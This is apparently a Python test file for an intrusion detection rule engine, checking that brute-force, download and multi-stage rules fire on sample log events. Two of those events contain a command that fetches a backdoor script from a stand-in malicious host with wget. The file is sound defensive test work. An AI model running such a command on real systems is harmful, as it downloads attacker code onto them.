from src.detection.rule_engine import detect_events

def test_bruteforce_detection():
    events = [
        {"raw": "failed login for user root", "correlation_key": "failed_login", "frequency": 3}
    ]
    detections = detect_events(events)
    assert any(d["rule_id"] == "R001" for d in detections)

def test_download_detection():
    events = [
        {"raw": "wget http://malicious.com/backdoor.sh", "correlation_key": "download_command", "frequency": 1}
    ]
    detections = detect_events(events)
    assert any(d["rule_id"] == "R002" for d in detections)

def test_multistage_detection():
    events = [
        {"raw": "failed login", "correlation_key": "failed_login", "frequency": 3},
        {"raw": "wget http://malicious.com/backdoor.sh", "correlation_key": "download_command", "frequency": 1}
    ]
    detections = detect_events(events)
    assert any(d["rule_id"] == "R003" for d in detections)
